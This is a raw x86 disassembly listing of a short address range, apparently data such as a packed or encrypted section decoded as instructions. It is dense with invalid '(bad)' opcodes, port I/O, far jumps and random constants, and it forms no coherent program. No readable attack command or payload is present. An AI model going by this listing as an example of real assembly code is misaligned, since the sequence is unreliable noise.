  4046d2:	fnstsw WORD PTR [edi+0x7bd7c27]
  4046d8:	sti    
  4046d9:	cmp    BYTE PTR [edx+ecx*1-0x4093255],dl
  4046e0:	jecxz  0x404720
  4046e2:	dec    edx
  4046e3:	inc    edx
  4046e4:	push   ecx
  4046e5:	ja     0x40474f
  4046e7:	mov    al,ds:0xf0638889
  4046ec:	mov    cs,eax
  4046ee:	cmp    BYTE PTR [ecx],0x30
  4046f1:	mov    DWORD PTR [ebx-0x2c],0x16f9b3b1
  4046f8:	pop    ds
  4046f9:	cmp    eax,ebx
  4046fb:	mov    bl,0x6b
  4046fd:	fnstsw WORD PTR [esi]
  4046ff:	(bad)  
  404700:	sbb    bh,bh
  404702:	and    BYTE PTR [edi+0x74],ch
  404705:	les    ebx,FWORD PTR [edx+ebp*2-0x3a]
  404709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40470a:	stc    
  40470b:	cmp    ebp,DWORD PTR [ecx-0x11]
  40470e:	arpl   WORD PTR [ecx+0x1],bp
  404711:	lds    eax,FWORD PTR [ebx+0x64f5a4c8]
  404717:	xor    al,0x79
  404719:	cmp    BYTE PTR [ebx],0xf9
  40471c:	xor    ebp,edi
  40471e:	retf   
  40471f:	sbb    al,0xdb
  404721:	btr    DWORD PTR ds:0x83488cf2,ecx
  404728:	sti    
  404729:	jg     0x4047a6
  40472b:	cmp    eax,0x84f95fa0
  404730:	fadd   QWORD PTR [esi-0x12d6afe9]
  404736:	mov    al,0x99
  404738:	dec    esi
  404739:	mov    al,0xb0
  40473b:	inc    ebx
  40473c:	xchg   edx,eax
  40473d:	or     BYTE PTR [edx-0x3d],dh
  404740:	call   0x36ef:0x48323adc
  404747:	outs   dx,BYTE PTR ds:[esi]
  404748:	adc    dh,BYTE PTR [edx]
  40474a:	sbb    DWORD PTR [esi+edi*4],edx
  40474d:	mov    cl,0x80
  40474f:	out    dx,eax
  404750:	aad    0xf
  404752:	dec    edx
  404753:	fild   DWORD PTR [edx-0x5f4cbe0a]
  404759:	mov    esi,0x90de1c1b
  40475e:	scas   eax,DWORD PTR es:[edi]
  40475f:	int    0x0
  404761:	gs pop ebp
  404763:	fnsave [esi+0x2856e61c]
  404769:	pop    edi
  40476a:	sub    DWORD PTR [edi+0xb],edx
  40476d:	inc    esp
  40476e:	xor    al,0xe3
  404770:	push   ds
  404771:	jg     0x4047de
  404773:	sbb    al,0x43
  404775:	imul   ebp,edi,0xffffffb5
  404778:	jge    0x40474b
  40477a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40477b:	or     DWORD PTR [edi],edi
  40477d:	or     dh,BYTE PTR [ecx]
  40477f:	mov    dl,0xef
  404781:	enter  0x6e95,0xca
  404785:	and    BYTE PTR [ebp-0x3b3a2848],dh
  40478b:	adc    DWORD PTR [ebx-0x5286c6d6],ebp
  404791:	test   DWORD PTR [edi-0x2b],esi
  404794:	xchg   esp,eax
  404795:	and    DWORD PTR ds:0xdda5d432,0xffffffb2
  40479c:	cli    
  40479d:	lods   al,BYTE PTR ds:[esi]
  40479e:	clc    
  40479f:	(bad)  
  4047a1:	je     0x40477a
  4047a3:	inc    edx
  4047a4:	stos   BYTE PTR es:[edi],al
  4047a5:	sbb    ebp,DWORD PTR [ebp+0x727e88c8]
  4047ab:	lds    edx,FWORD PTR [eax+0x6c]
  4047ae:	pop    ecx
  4047af:	inc    ebx
  4047b0:	or     al,0x82
  4047b2:	leave  
  4047b3:	inc    edx
  4047b4:	inc    ecx
  4047b5:	jp     0x40476d
  4047b7:	mov    esi,0x4fbac766
  4047bc:	mov    BYTE PTR [ebx],cl
  4047be:	or     DWORD PTR ds:0xf4c25eb0,0xffffffdb
  4047c5:	cmp    eax,0xf9522a72
  4047ca:	fwait
  4047cb:	or     BYTE PTR [eax-0x787e638],bl
  4047d1:	inc    edi
  4047d2:	mov    bh,0xb6
  4047d4:	enter  0xfd45,0xae
  4047d8:	jmp    0x7351:0x19790a9e
  4047df:	sahf   
  4047e0:	pop    esi
  4047e1:	cmp    DWORD PTR ds:0x4906d793,edx
  4047e7:	adc    al,0xe4
  4047e9:	cli    
  4047ea:	sbb    al,0x7b
  4047ec:	xchg   ebx,eax
  4047ed:	bnd ja 0x4047e7
  4047f0:	shl    cl,cl
  4047f2:	pop    ebx
  4047f3:	hlt    
  4047f4:	fsub   DWORD PTR [ecx+0x3a03195b]
  4047fa:	sbb    edx,edx
  4047fc:	add    dl,BYTE PTR [edx]
  4047fe:	imul   esi,DWORD PTR [esi+0x57ca11a6],0x2e0bfa6c
  404808:	cmp    al,0x42
  40480a:	xchg   esp,eax
  40480b:	jl     0x404872
  40480d:	(bad)  
  40480e:	xchg   esi,eax
  40480f:	xchg   DWORD PTR [edi],esi
  404811:	add    BYTE PTR [edx+0x63],0xd1
  404815:	or     ch,BYTE PTR [esp+esi*2]
  404818:	and    ah,BYTE PTR [esi+0x5b]
  40481b:	arpl   WORD PTR [edi-0x5c],dx
  40481e:	jle    0x404879
  404820:	dec    edi
  404821:	push   eax
  404822:	inc    edx
  404823:	inc    ebx
  404824:	pop    ecx
  404825:	xor    eax,0xd5c8f433
  40482a:	sub    edx,edi
  40482c:	push   ss
  40482d:	jno    0x404881
  40482f:	icebp  
  404830:	cli    
  404831:	pushf  
  404832:	pop    esi
  404833:	mov    ebp,0x33855818
  404838:	xor    BYTE PTR [edx+0x3e077c84],ah
  40483e:	fsub   DWORD PTR [eax+0x1b2ccdae]
  404844:	call   0x7ffb:0x7a405a0d
  40484b:	in     eax,0x8c
  40484d:	in     al,dx
  40484e:	gs xor bl,bl
  404851:	test   eax,0x7c0f33e4
  404856:	jge    0x404866
  404858:	mov    bl,0xeb
  40485a:	(bad)  
  40485b:	out    dx,al
  40485c:	mov    dl,0x16
  40485e:	mov    ds:0x61ef7ba3,al
  404863:	popf   
  404864:	mov    ebp,0xcec72d1d
  404869:	adc    al,0xf6
  40486b:	inc    ebx
  40486c:	mov    edx,0x98df61ad
  404871:	mov    dl,0x7d
  404873:	or     dh,al
  404875:	xchg   BYTE PTR [edi],bl
  404877:	jle    0x4048d8
  404879:	sar    ebp,0x33
  40487c:	pop    ds
  40487d:	or     eax,0x8d41c2d3
  404882:	shr    ebp,1
  404884:	and    edx,edi
  404886:	inc    edi
  404887:	mov    ebx,ebp
  404889:	xor    BYTE PTR [ecx-0x4879d299],ah
  40488f:	cwde   
  404890:	scas   al,BYTE PTR es:[edi]
  404891:	int    0x5b
  404893:	call   0x4ee3:0x61273653
  40489a:	ds in  al,0xcc
  40489d:	mov    esi,esi
  40489f:	xchg   ecx,eax
  4048a0:	jb     0x404895
  4048a2:	ins    DWORD PTR es:[edi],dx
  4048a3:	ret    0xebcd
  4048a6:	loopne 0x40486b
  4048a8:	cli    
  4048a9:	(bad)  
  4048aa:	out    0x35,al
  4048ac:	retf   0x6423
  4048af:	fwait
  4048b0:	test   BYTE PTR [edi-0x51],0xc4
  4048b4:	push   ebx
  4048b5:	out    0x86,eax
  4048b7:	pop    ebx
  4048b8:	add    eax,eax
  4048ba:	pop    eax
  4048bb:	mov    eax,0xa68851b8
  4048c0:	in     eax,dx
  4048c1:	dec    ebx
  4048c2:	and    al,0x1c
  4048c4:	das    
  4048c5:	mov    ch,0xe7
  4048c7:	icebp  
  4048c8:	stc    
  4048c9:	mov    DWORD PTR [eax+0x36],ecx
  4048cc:	repz mov ah,0xcd
  4048cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048d0:	int    0x47
  4048d2:	jb     0x4048ec
  4048d4:	inc    edx
  4048d5:	pop    esp
  4048d6:	stos   BYTE PTR es:[edi],al
  4048d7:	shr    DWORD PTR [ebx-0x5a],cl
  4048da:	push   ebx
  4048db:	ins    DWORD PTR es:[edi],dx
  4048dc:	push   edi
  4048dd:	std    
  4048de:	jnp    0x4048b6
  4048e0:	pop    esi
  4048e1:	add    BYTE PTR [esi*1+0x6680a7ad],ah
  4048e8:	aad    0xab
  4048ea:	push   edx
  4048eb:	jmp    0xce9a:0x9975b6cc
  4048f2:	or     BYTE PTR [edi],ah
  4048f4:	cs sti 
  4048f6:	test   BYTE PTR [ecx-0x5962264a],0xba
  4048fd:	popf   
  4048fe:	shl    DWORD PTR [edi-0x51],0x30
  404902:	dec    edi
  404903:	cmp    DWORD PTR [esp+edx*1],esi
  404906:	fdivr  DWORD PTR [edx]
  404908:	xor    BYTE PTR [ebx+0x65c24b49],al
  40490e:	or     BYTE PTR [edi],ah
  404910:	shl    BYTE PTR [edx-0x6de47354],cl
  404916:	in     al,dx
  404917:	xchg   ecx,eax
  404918:	es call 0xc361:0xfeb05669
  404920:	cwde   
  404921:	scas   eax,DWORD PTR es:[edi]
  404922:	outs   dx,BYTE PTR ds:[esi]
  404923:	(bad)  
  404924:	shl    BYTE PTR [esi],1
  404926:	mov    DWORD PTR [esi-0x24],edx
  404929:	dec    ebx
  40492a:	das    
  40492b:	and    eax,0x27f78f6e
  404930:	icebp  
  404931:	cmp    BYTE PTR [esi+ecx*2-0x6eee3a8b],bl
  404938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404939:	in     eax,dx
  40493a:	(bad)  [edi-0x32]
  40493d:	int3   
  40493e:	test   eax,0x7036953a
  404943:	fimul  DWORD PTR [esi]
  404945:	dec    ecx
  404946:	enter  0xfa45,0x74
  40494a:	jne    0x404916
  40494c:	xchg   ecx,eax
  40494d:	jmp    0xc0ec:0xa6358e98
  404954:	inc    esp
  404955:	stos   DWORD PTR es:[edi],eax
  404956:	or     bh,BYTE PTR [ecx+0x20]
  404959:	out    0x3e,eax
  40495b:	(bad)  
  40495c:	stc    
  40495d:	adc    al,0x1
  40495f:	(bad)  
  404960:	jbe    0x4049db
  404962:	ret    
  404963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404964:	xchg   edi,eax
  404965:	mov    dh,BYTE PTR [ebx-0x3bc6a841]
  40496b:	adc    al,0x9a
  40496d:	test   al,0xd9
  40496f:	jb     0x4049c7
  404971:	add    cl,cl
  404973:	and    eax,0xb3c33def
  404978:	pushf  
  404979:	lea    esp,[eax+0x2d7d1d83]
  40497f:	mov    esp,0xd7f1c9a3
  404984:	or     ebp,DWORD PTR [esi]
  404986:	pusha  
  404987:	sahf   
  404988:	lahf   
  404989:	push   edi
  40498a:	xlat   BYTE PTR ds:[ebx]
  40498b:	ret    
  40498c:	mov    edx,0xea380db4
  404991:	inc    esi
  404992:	sbb    esp,edi
  404994:	jle    0x404a11
  404996:	mov    edx,0x255fab03
  40499b:	fiadd  DWORD PTR [eax+0x45]
  40499e:	cs faddp st(4),st
  4049a1:	ds push ebx
  4049a3:	(bad)  
  4049a4:	cmp    BYTE PTR [eax+0x1e],bh
  4049a7:	bound  edi,QWORD PTR [ebx+edi*4]
  4049aa:	push   cs
  4049ab:	mov    esp,0xd71c267
  4049b0:	jle    0x4049fa
  4049b2:	adc    al,BYTE PTR [esp+ecx*2]
  4049b5:	or     al,0xc
  4049b7:	dec    esi
  4049b8:	and    ebx,edx
  4049ba:	into   
  4049bb:	push   ebx
  4049bc:	cmp    ebp,edi
  4049be:	mov    esp,0xd353403
  4049c3:	inc    eax
  4049c4:	imul   ecx,DWORD PTR es:[edi+ebx*4+0x253b7df9],0x35
  4049cd:	enter  0x12c5,0x71
  4049d1:	arpl   WORD PTR [ebx],dx
  4049d3:	outs   dx,BYTE PTR ds:[esi]
  4049d5:	sbb    eax,0x1132135
  4049da:	inc    ebx
  4049db:	jno    0x404a5c
  4049dd:	mov    al,ds:0xdd5b0d7
  4049e2:	arpl   WORD PTR [esi],sp
  4049e4:	push   edi
  4049e5:	fcmove st,st(6)
  4049e8:	jmp    0x4049b3
  4049ea:	icebp  
  4049eb:	and    esi,esi
  4049ed:	jnp    0x4049dc
  4049ef:	lock mov eax,ds:0x644ff1cb
  4049f5:	or     ch,ch
  4049f7:	jb     0x4049c6
  4049f9:	push   ss
  4049fa:	xchg   edi,eax
  4049fb:	sahf   
  4049fc:	les    eax,FWORD PTR [eax+edx*4]
  4049ff:	mov    DWORD PTR [ecx],ebx
  404a01:	inc    esi
  404a02:	lods   al,BYTE PTR ds:[esi]
  404a03:	ja     0x404997
  404a05:	icebp  
  404a06:	jp     0x404a7c
  404a08:	pop    ss
  404a09:	ja     0x404a81
  404a0b:	call   0x73e6d691
  404a10:	mov    bl,0x7b
  404a12:	mov    bl,BYTE PTR [ebx]
  404a14:	ins    DWORD PTR es:[edi],dx
  404a15:	mov    cs,ebp
  404a17:	call   0x8ff5:0xce81fb2f
  404a1e:	dec    ecx
  404a1f:	or     eax,0x40434bc7
  404a24:	mov    ebp,0xe6f10c8
  404a29:	fistp  DWORD PTR [ecx-0x7]
  404a2c:	dec    eax
  404a2d:	xadd   BYTE PTR [ebx+0x7bbc7b05],ch
  404a34:	pop    es
  404a35:	cmp    edi,DWORD PTR [eax+edi*1]
  404a38:	jg     0x404a52
  404a3a:	loopne 0x404a6f
  404a3c:	lods   eax,DWORD PTR ds:[esi]
  404a3d:	mov    gs,edi
  404a3f:	adc    al,0x20
  404a41:	bound  esp,QWORD PTR [edi-0x32]
  404a44:	ds and BYTE PTR gs:[eax-0x63c91d1f],al
  404a4c:	ror    edx,cl
  404a4e:	mov    eax,0x2dca1ee0
  404a53:	popf   
  404a54:	dec    esi
  404a55:	or     eax,0x6a4c531c
  404a5a:	out    dx,al
  404a5b:	movlps xmm2,QWORD PTR [ebp-0x7a6f5fa1]
  404a62:	or     cl,bl
  404a64:	dec    esi
  404a65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a66:	xchg   edi,eax
  404a67:	movhps QWORD PTR [eax-0x74],xmm2
  404a6b:	pop    ecx
  404a6c:	sti    
  404a6d:	pop    ebx
  404a6e:	xchg   esi,eax
  404a6f:	leave  
  404a70:	or     BYTE PTR ds:0xdc89260a,bh
  404a76:	cmp    cl,BYTE PTR [ebx*1+0x47d272ba]
  404a7d:	xor    bh,dl
  404a7f:	mov    ds:0x4bd56877,al
  404a84:	inc    eax
  404a85:	mov    edx,0xe8b12ef1
  404a8a:	aas    
  404a8b:	or     al,0x41
  404a8d:	jg     0x404a26
  404a8f:	iret   
  404a90:	and    ebx,ecx
  404a92:	inc    ecx
  404a93:	loopne 0x404a31
  404a95:	pushf  
  404a96:	mov    DWORD PTR [ebx+eax*8+0x22],edi
  404a9a:	push   edi
  404a9b:	push   ds
  404a9c:	or     DWORD PTR [esi+eiz*1],esi
  404a9f:	and    al,0x18
  404aa1:	adc    DWORD PTR [esi-0x1e5fc5c2],ecx
  404aa7:	push   ss
  404aa8:	retf   0x8de6
  404aab:	call   0xbd220e25
  404ab0:	std    
  404ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ab2:	lahf   
  404ab3:	stos   BYTE PTR es:[edi],al
  404ab4:	jmp    0xc7e0:0x7d70f9c7
  404abb:	jmp    0x3535c93a
  404ac0:	jmp    0x63cc:0xc7c4d5ac
  404ac7:	inc    edx
  404ac8:	jb     0x404b49
  404aca:	adc    bl,bl
  404acc:	mov    esp,0x50ace3e8
  404ad1:	test   eax,0xd451f129
  404ad6:	aas    
  404ad7:	pop    esi
  404ad8:	mov    ebx,0xaf43fc30
  404add:	in     al,0xc0
  404adf:	sbb    al,0x63
  404ae1:	dec    edx
  404ae2:	mov    esp,ecx
  404ae4:	(bad)  
  404ae5:	imul   ebx,esi,0xb3de0c03
  404aeb:	mov    al,ds:0x2184c6ed
  404af0:	shl    BYTE PTR [edx+0x403bcbef],cl
  404af6:	cmp    ch,BYTE PTR [esi+0x73f8d93c]
  404afc:	enter  0x2131,0x52
  404b00:	push   esp
  404b01:	das    
  404b02:	rcr    DWORD PTR [ebp+edx*1+0x5b],1
  404b06:	add    BYTE PTR [edi],dl
  404b08:	ret    
  404b09:	mov    bl,0x38
  404b0b:	mov    ds:0x977d414,eax
  404b10:	stc    
  404b11:	dec    esi
  404b12:	sub    al,0x7c
  404b14:	adc    BYTE PTR [bp+di-0x19],dl
  404b18:	push   eax
  404b19:	mov    bl,0x66
  404b1b:	xchg   esi,eax
  404b1c:	out    dx,al
  404b1d:	mov    esp,0xf551c91
  404b22:	jae    0x404ac3
  404b24:	jbe    0x404b4d
  404b26:	and    DWORD PTR [edx],esp
  404b28:	js     0x404aad
  404b2a:	fcomp  QWORD PTR [esp+esi*2-0x18]
  404b2e:	mov    ecx,0x4f1c6f8c
  404b33:	(bad)  
  404b35:	mov    ch,0x9e
  404b37:	jae    0x404ae8
  404b39:	inc    ebx
  404b3a:	pop    esp
  404b3b:	daa    
  404b3c:	ins    DWORD PTR es:[edi],dx
  404b3d:	pop    ds
  404b3e:	stos   BYTE PTR es:[edi],al
  404b3f:	mov    ds:0x6fd26c9f,al
  404b44:	xor    ebx,DWORD PTR [esi-0x4c]
  404b47:	ins    DWORD PTR es:[edi],dx
  404b48:	inc    ah
  404b4a:	add    al,0xee
  404b4c:	pushf  
  404b4d:	cmp    eax,0x7c99bfa4
  404b52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b53:	lock adc al,0xa8
  404b56:	call   0xdacf:0xe5cd6c0a
  404b5d:	(bad)  
  404b5e:	fstp   QWORD PTR [esp+ebp*1-0x7bfdbbb5]
  404b65:	pop    edi
  404b66:	adc    eax,0xcb103883
  404b6b:	pop    es
  404b6c:	mov    bh,0x82
  404b6e:	ret    
  404b6f:	and    DWORD PTR [edi],edi
  404b71:	enter  0xb347,0xec
  404b75:	push   ecx
  404b76:	adc    eax,0x6b48c9ef
  404b7b:	jbe    0x404bbe
  404b7d:	idiv   DWORD PTR [eax-0x24]
  404b80:	imul   esp,DWORD PTR [eax],0xb4f9efdd
  404b86:	jmp    0x67c44e7d
  404b8b:	sbb    cl,BYTE PTR [esi]
  404b8d:	stos   DWORD PTR es:[edi],eax
  404b8e:	adc    DWORD PTR [edi-0x6630632d],ebx
  404b94:	rcl    BYTE PTR [ebp-0x27],cl
  404b97:	fild   WORD PTR [ecx+0x2b4caa77]
  404b9d:	lods   eax,DWORD PTR ds:[esi]
  404b9e:	mov    eax,0x2e0a9c68
  404ba3:	int    0xe1
  404ba5:	fwait
  404ba6:	xor    DWORD PTR [edx+0x53],edx
  404ba9:	jmp    0xc6b:0xf371fbd8
  404bb0:	loopne 0x404b4b
  404bb2:	mov    eax,0x5773c489
  404bb7:	rcl    BYTE PTR [edx],0x65
  404bba:	jmp    0xfcb4:0x958eabc9
  404bc1:	retf   
  404bc2:	jmp    0x4a17:0x1669a13b
  404bc9:	add    al,0x94
  404bcb:	call   0x48a7:0xe04f4cd5
  404bd2:	nop
  404bd3:	xor    al,0x3e
  404bd5:	push   ecx
  404bd6:	inc    edx
  404bd7:	add    BYTE PTR [eax],ah
  404bd9:	jbe    0x404bc1
  404bdb:	sub    BYTE PTR [eax+0x26a410fe],ch
  404be1:	and    BYTE PTR [ebp+eiz*8+0x6cdd9b54],ah
  404be8:	inc    edx
  404be9:	pop    ebx
  404bea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404beb:	pop    DWORD PTR [ebx+0x53494ed0]
  404bf1:	xchg   edx,eax
  404bf2:	mov    ah,0xee
  404bf4:	ins    DWORD PTR es:[edi],dx
  404bf5:	sbb    bl,BYTE PTR [edx+0x12]
  404bf8:	sub    eax,0x2866b25e
  404bfd:	ss inc esi
  404bff:	fs inc eax
  404c01:	adc    edx,eax
  404c03:	mov    ds:0x933ad6d4,eax
  404c08:	icebp  
  404c09:	aad    0x4d
  404c0b:	and    cl,BYTE PTR [esi+0x3a]
  404c0e:	cmp    bh,BYTE PTR [edi]
  404c10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c11:	sbb    edx,DWORD PTR [ecx+0x4d]
  404c14:	ret    
  404c15:	pop    ebx
  404c16:	dec    esi
  404c17:	int3   
  404c18:	shl    DWORD PTR [edx+0x1a],0x9c
  404c1c:	push   ss
  404c1d:	fdivrp st(4),st
  404c1f:	pop    esp
  404c20:	inc    eax
  404c21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c22:	sub    bh,BYTE PTR [eax+edx*2-0x7fdf0a90]
  404c29:	lds    esp,FWORD PTR ds:[edi+0x6546a888]
  404c30:	sub    BYTE PTR [edx+0x21cfbc96],0x70
  404c37:	push   ebp
  404c38:	pop    ebp
  404c39:	mov    DWORD PTR [ebx+edi*8+0x7b9af540],edx
  404c40:	xchg   DWORD PTR [eax],eax
  404c42:	sub    DWORD PTR [edi-0x1b],0x50
  404c46:	cmp    edx,DWORD PTR [esp+edi*1+0x2b9be4eb]
  404c4d:	fild   QWORD PTR [eax-0x6587bdee]
  404c53:	fwait
  404c54:	push   ecx
  404c55:	pop    ebx
  404c56:	or     DWORD PTR [ebx-0x7f262646],ecx
  404c5c:	monitor 
  404c5f:	in     al,0xc1
  404c61:	push   0x9
  404c63:	pop    esp
  404c64:	inc    ebp
  404c65:	dec    edx
  404c66:	sub    DWORD PTR [ecx+edi*8-0x55],eax
  404c6a:	lods   eax,DWORD PTR ds:[esi]
  404c6b:	pop    ecx
  404c6c:	stc    
  404c6d:	cs mov ebp,0xe72b8170
  404c73:	inc    ebp
  404c74:	adc    al,0xcb
  404c76:	pop    es
  404c77:	mov    ebx,0x34dfe7f5
  404c7c:	arpl   si,sp
  404c7e:	sbb    eax,0xe9d311c5
  404c83:	mov    DWORD PTR [eax],ebx
  404c85:	pop    esi
  404c86:	mov    DWORD PTR [edx+0x738eca4e],0x720a923
  404c90:	clc    
  404c91:	and    BYTE PTR [eax+0x2adfef3b],bh
  404c97:	push   0xaec80c12
  404c9c:	into   
  404c9d:	(bad)  
  404c9e:	pop    edx
  404c9f:	imul   edx,DWORD PTR [esi+0x16],0xfffffffc
  404ca3:	push   0xffffff89
  404ca5:	mov    esp,ebx
  404ca7:	jmp    0x404cc1
  404ca9:	(bad)  
  404caa:	ret    
  404cab:	push   cs
  404cac:	aam    0x72
  404cae:	mov    cs:0x4fb8d643,al
  404cb4:	push   eax
  404cb5:	xor    DWORD PTR [edx+edi*2],esi
  404cb8:	and    BYTE PTR [ecx-0x54],cl
  404cbb:	cmp    al,0xed
  404cbd:	inc    ebp
  404cbe:	or     cl,BYTE PTR [edi]
  404cc0:	push   ss
  404cc1:	ins    DWORD PTR es:[edi],dx
  404cc2:	and    bh,BYTE PTR [edi-0x6caf15c4]
  404cc8:	inc    esp
  404cc9:	sub    BYTE PTR [esi],bl
  404ccb:	mov    edi,cs
  404ccd:	(bad)  
  404cce:	hlt    
  404ccf:	test   DWORD PTR ds:0xd6036b28,ebx
  404cd5:	adc    bl,BYTE PTR [ebp-0x40]
  404cd8:	cdq    
  404cd9:	cmp    dh,BYTE PTR [ecx-0x36]
  404cdc:	jbe    0x404d0e
  404cde:	cmp    ch,BYTE PTR [edx+0x67]
  404ce1:	pop    esi
  404ce2:	dec    edi
  404ce3:	ss push ebp
  404ce5:	int    0xce
  404ce7:	outs   dx,DWORD PTR ds:[esi]
  404ce8:	(bad)  
  404ce9:	mov    ah,0x44
  404ceb:	in     al,dx
  404cec:	shl    DWORD PTR [ecx-0x39],1
  404cef:	push   ebp
  404cf0:	out    dx,al
  404cf1:	xlat   BYTE PTR ds:[ebx]
  404cf2:	xor    BYTE PTR [edi+0x33e52ebb],0x37
  404cf9:	fisttp WORD PTR [edx-0x69]
  404cfc:	fidiv  DWORD PTR [esi+edx*8+0x7e]
  404d00:	lahf   
  404d01:	pop    ss
  404d02:	leave  
  404d03:	out    0x6c,eax
  404d05:	adc    edx,DWORD PTR [esi-0x10315b5f]
  404d0b:	jecxz  0x404d66
  404d0d:	enter  0xfa3a,0x2a
  404d11:	ins    DWORD PTR es:[edi],dx
  404d12:	dec    eax
  404d13:	push   edi
  404d14:	jp     0x404d84
  404d16:	jmp    0x404d46
  404d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d19:	int    0xfa
  404d1b:	xchg   edx,eax
  404d1c:	sbb    eax,0x8a70e871
  404d21:	jmp    0xd4f8ec00
  404d26:	sar    DWORD PTR [edx-0x8],0x3b
  404d2a:	adc    eax,0x57ba923b
  404d2f:	and    ebp,0x3653fe7b
  404d35:	push   edx
  404d36:	dec    ebp
  404d37:	jg     0x404d7d
  404d39:	stos   DWORD PTR es:[edi],eax
  404d3a:	cmp    al,0x17
  404d3c:	jmp    0xf51ae4e3
  404d41:	nop
  404d42:	cmp    eax,0xa822289d
  404d47:	push   DWORD PTR fs:[eax+esi*1-0x7ebba700]
  404d4f:	pop    es
  404d50:	fdiv   QWORD PTR [eax]
  404d52:	scas   al,BYTE PTR es:[edi]
  404d53:	in     eax,0x1
  404d55:	dec    ebx
  404d56:	mov    ch,0xb7
  404d58:	push   esi
  404d59:	push   esp
  404d5a:	pop    ds
  404d5b:	add    al,0x8a
  404d5d:	scas   eax,DWORD PTR es:[edi]
  404d5e:	ja     0x404d9e
  404d60:	mov    ebp,0x42192b37
  404d65:	xlat   BYTE PTR ds:[ebx]
  404d66:	cmp    BYTE PTR [eax],al
  404d68:	fwait
  404d69:	inc    edx
  404d6a:	mov    al,0xdb
  404d6c:	push   0x54022213
  404d71:	(bad)  
  404d72:	je     0x404d08
  404d74:	add    DWORD PTR [esi-0x20],esi
  404d77:	add    edx,DWORD PTR [ebx]
  404d79:	out    0xe0,al
  404d7b:	adc    eax,0x126cfc4b
  404d80:	jbe    0x404dc0
  404d82:	dec    ebp
  404d83:	data16 sbb al,0x9b
  404d86:	repz mov eax,0xa2b8e541
  404d8c:	imul   DWORD PTR [esp+edi*4]
  404d8f:	mov    esi,0xdccfe7fa
  404d94:	jb     0x404d97
  404d96:	out    dx,al
  404d97:	or     BYTE PTR [eax-0x3f1bccd3],bl
  404d9d:	push   edx
  404d9e:	mov    ecx,0xa95a3542
  404da3:	mov    bh,BYTE PTR [edi+0xa]
  404da6:	(bad)  
  404da7:	jp     0x404daf
  404da9:	cmc    
  404daa:	pusha  
  404dab:	je     0x404e2b
  404dad:	out    dx,al
  404dae:	jnp    0x404d57
  404db0:	add    al,0x28
  404db2:	mov    ds:0x4f426463,al
  404db7:	jg     0x404dc0
  404db9:	mov    DWORD PTR [esi-0x6bfaffa9],edi
  404dbf:	bound  esp,QWORD PTR [ebp+0x2a]
  404dc2:	(bad)  
  404dc3:	fisub  WORD PTR [esi]
  404dc5:	mov    eax,ds:0x39375ead
  404dca:	xchg   esi,eax
  404dcb:	les    esi,FWORD PTR [bx+di-0x70]
  404dcf:	in     eax,0x98
  404dd1:	(bad)  
  404dd2:	int    0x85
  404dd4:	dec    ecx
  404dd5:	mov    esi,0x57902ec2
  404dda:	popf   
  404ddb:	mov    esp,DWORD PTR [eax]
  404ddd:	out    0x76,al
  404ddf:	out    0xd7,al
  404de1:	xchg   dx,ax
  404de3:	scas   al,BYTE PTR es:[edi]
  404de4:	lea    eax,[ebp+0x62]
  404de7:	ds jb  0x404e15
  404dea:	jp     0x404de0
  404dec:	iret   
  404ded:	xor    eax,0x7f813f0f
  404df2:	mov    ecx,0xe04faf36
  404df7:	pop    eax
  404df8:	in     al,0x91
  404dfa:	adc    ebx,ebx
  404dfc:	call   0x68d9af25
  404e01:	sbb    al,0x7c
  404e03:	test   BYTE PTR [ebp+0x62592f7],ch
  404e09:	cdq    
  404e0a:	shr    DWORD PTR [ecx-0x1c],0xaf
  404e0e:	mov    ch,0xb5
  404e10:	sbb    cl,BYTE PTR [eax+0x49afc72b]
  404e16:	ficom  WORD PTR [ebx]
  404e18:	lods   eax,DWORD PTR ds:[esi]
  404e19:	cs jo  0x404df7
  404e1c:	neg    DWORD PTR [ecx]
  404e1e:	aam    0xe2
  404e20:	xchg   ebx,eax
  404e21:	icebp  
  404e22:	pop    esp
  404e23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e24:	dec    eax
  404e25:	jecxz  0x404de0
  404e27:	pop    esi
  404e28:	test   DWORD PTR [ebx-0x730a88c6],0x90f49d9f
  404e32:	int    0x4a
  404e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e35:	ret    
  404e36:	inc    ecx
  404e37:	js     0x404e94
  404e39:	sbb    bl,0x2
  404e3c:	pop    ebx
  404e3d:	not    BYTE PTR [eax+0x491e527d]
  404e43:	out    dx,eax
  404e44:	rol    BYTE PTR [edi+0x7d],0xb2
  404e48:	dec    ebx
  404e49:	mov    edx,0xadc9d186
  404e4e:	jbe    0x404dfe
  404e50:	rcr    BYTE PTR [edi+0x1f],cl
  404e53:	fs jns 0x404dd9
  404e56:	sar    BYTE PTR ds:0x380468bc,1
  404e5c:	(bad)  
  404e5d:	xchg   esp,eax
  404e5e:	ret    
  404e5f:	xor    al,0x23
  404e61:	mov    eax,ds:0xf31f7b1
  404e66:	xor    al,0x78
  404e68:	nop
  404e69:	ins    BYTE PTR es:[edi],dx
  404e6a:	lds    ebx,FWORD PTR [edi-0x735eaa00]
  404e70:	mov    edi,?
  404e72:	jbe    0x404e2d
  404e74:	pushf  
  404e75:	stos   BYTE PTR es:[edi],al
  404e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e77:	mov    al,0xd
  404e79:	mov    eax,ds:0x197af685
  404e7e:	int    0xa
  404e80:	push   edi
  404e81:	lea    edx,[ecx-0x1f]
  404e84:	mov    edx,0xdd9557b
  404e89:	mov    ebp,0x26ad6c93
  404e8e:	jae    0x404e4d
  404e90:	xor    al,0x91
  404e92:	sbb    DWORD PTR [eax],esp
  404e94:	pop    es
  404e95:	add    bl,BYTE PTR [edi+ebp*8]
  404e98:	in     eax,0x3c
  404e9a:	outs   dx,DWORD PTR ds:[esi]
  404e9b:	xchg   edi,eax
